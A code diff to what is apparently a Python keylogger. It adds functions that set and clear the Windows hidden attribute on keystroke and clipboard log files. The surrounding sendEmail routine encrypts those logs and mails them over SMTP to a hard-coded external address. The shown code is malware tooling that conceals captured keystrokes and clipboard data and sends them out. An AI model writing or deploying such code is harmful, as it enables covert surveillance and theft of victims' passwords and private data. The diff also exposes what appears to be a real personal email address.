@@ -3,24 +3,46 @@ import smtplib
 from email.message import EmailMessage
 import os
 import ctypes
+# from keylogger import hide
+# from keylogger import unhide 
 from encryption import encryptContents 
+
+log_file = "logs.txt"
+clipBoard_file = "clipBoardLogs.txt"
+
+def unhide():
+    if os.path.exists(log_file):
+        print("unhidden")
+        os.system(f'attrib -h "{log_file}"')
+
+    if os.path.exists(clipBoard_file):
+        os.system(f'attrib -h "{clipBoard_file}"')
+
+def hide():
+    if os.path.exists(log_file):
+        os.system(f'attrib +h "{log_file}"')
+
+    if os.path.exists(clipBoard_file):
+        os.system(f'attrib +h "{clipBoard_file}"')
+
 
 def sendEmail():
     print("sending")
 
     if os.path.exists("logs.txt"):
         print("here")
-        os.system(f'attrib -h "{"logs.txt"}"')
+        # os.system(f'attrib -h "{"logs.txt"}"')
+        unhide()
     if os.path.exists("clipBoardLogs.txt"):
         print("here")
+        unhide()
+        # os.system(f'attrib -h "{"clipBoardLogs.txt"}"')
 
-        os.system(f'attrib -h "{"clipBoardLogs.txt"}"')
 
-
-    log_file = encryptContents("logs.txt")
-    print(log_file)
-    clipBoard_file = encryptContents("clipBoardLogs.txt")
-    print(clipBoard_file)
+    nlog_file = encryptContents("logs.txt")
+    print(nlog_file)
+    nclipBoard_file = encryptContents("clipBoardLogs.txt")
+    print(nclipBoard_file)
     sender = "hello@demomailtrap.com"
     receiver = "ukharbanda20@gmail.com"
     
@@ -47,6 +69,7 @@ def sendEmail():
             os.system(f'attrib +h "{"logs.bin"}"')
         if os.path.exists("clipBoardLogs.bin"):
             os.system(f'attrib +h "{"clipBoardLogs.bin"}"')
+        hide()
 
         with smtplib.SMTP("live.smtp.mailtrap.io", 587) as server:
             server.starttls()
